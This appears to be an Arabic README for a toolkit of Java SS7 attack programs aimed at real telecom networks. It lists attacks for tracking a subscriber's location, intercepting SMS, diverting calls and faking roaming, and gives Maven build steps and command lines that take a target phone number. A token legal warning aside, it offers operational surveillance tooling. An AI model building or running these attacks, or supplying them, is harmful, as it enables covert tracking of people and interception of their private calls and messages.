# هجمات SS7 الحقيقية

هذا المجلد يحتوي على أكواد جافا لتنفيذ هجمات SS7 حقيقية على شبكات الاتصالات. هذه الأكواد تستخدم مكتبة jSS7 (Restcomm SS7) للاتصال بشبكات SS7 الحقيقية.

## تحذير قانوني

استخدام هذه الأكواد على شبكات حقيقية دون ترخيص قانوني يعتبر غير قانوني في معظم البلدان. يجب استخدام هذه الأكواد فقط في بيئات اختبار مرخصة وبموافقة مسبقة من الجهات المعنية.

## متطلبات التشغيل

1. مكتبة jSS7 (Restcomm SS7)
2. بيئة تطوير جافا (JDK 8 أو أحدث)
3. Maven أو Gradle لإدارة التبعيات
4. وصول إلى شبكة SS7 (بوابة SS7 أو STP)

## الهجمات المتوفرة

### 1. AnyTimeInterrogation (تتبع الموقع)

ملف: `AnyTimeInterrogationAttack.java`

يستخدم عملية AnyTimeInterrogation لتتبع موقع المستخدم المستهدف من خلال شبكة SS7.

### 2. SMS Interception (اعتراض الرسائل النصية)

ملف: `SMSInterceptionAttack.java`

يستخدم عمليتي SendRoutingInfoForSM و MT-ForwardSM لاعتراض الرسائل النصية المرسلة إلى المستخدم المستهدف.

### 3. Call Interception (التنصت على المكالمات)

ملف: `CallInterceptionAttack.java`

يستخدم عملية InsertSubscriberData لتعديل إعدادات تحويل المكالمات للمستخدم المستهدف، مما يسمح باعتراض المكالمات الواردة.

### 4. Fake Roaming (خداع الشبكة)

ملف: `FakeRoamingAttack.java`

يستخدم عملية UpdateLocation لجعل المستخدم المستهدف يظهر كأنه في بلد آخر (تجوال مزيف).

## طريقة التجميع

لتجميع هذه الأكواد إلى ملفات JAR قابلة للتنفيذ:

1. قم بتثبيت مكتبة jSS7:
```
git clone https://github.com/HN1A/sigploit-ss7.git
cd sigploit-ss7
mvn clean install
```

2. أنشئ مشروع Maven جديد وأضف التبعيات التالية إلى ملف pom.xml:
```xml
<dependencies>
    <dependency>
        <groupId>org.restcomm.protocols.ss7</groupId>
        <artifactId>map-api</artifactId>
        <version>7.4.0</version>
    </dependency>
    <dependency>
        <groupId>org.restcomm.protocols.ss7</groupId>
        <artifactId>map-impl</artifactId>
        <version>7.4.0</version>
    </dependency>
    <dependency>
        <groupId>org.restcomm.protocols.ss7</groupId>
        <artifactId>sccp-api</artifactId>
        <version>7.4.0</version>
    </dependency>
    <dependency>
        <groupId>org.restcomm.protocols.ss7</groupId>
        <artifactId>tcap-api</artifactId>
        <version>7.4.0</version>
    </dependency>
</dependencies>
```

3. انسخ ملفات Java إلى مجلد src/main/java في مشروع Maven

4. قم بتجميع المشروع:
```
mvn clean package
```

5. ستجد ملف JAR في مجلد target

## طريقة الاستخدام

لتنفيذ هجوم AnyTimeInterrogation:
```
java -jar ss7-attacks.jar AnyTimeInterrogationAttack <target_msisdn>
```

لتنفيذ هجوم SMS Interception:
```
java -jar ss7-attacks.jar SMSInterceptionAttack <target_msisdn> <interceptor_msisdn>
```

لتنفيذ هجوم Call Interception:
```
java -jar ss7-attacks.jar CallInterceptionAttack <target_msisdn> <interceptor_msisdn>
```

لتنفيذ هجوم Fake Roaming:
```
java -jar ss7-attacks.jar FakeRoamingAttack <target_msisdn> <fake_mcc> <fake_mnc>
```
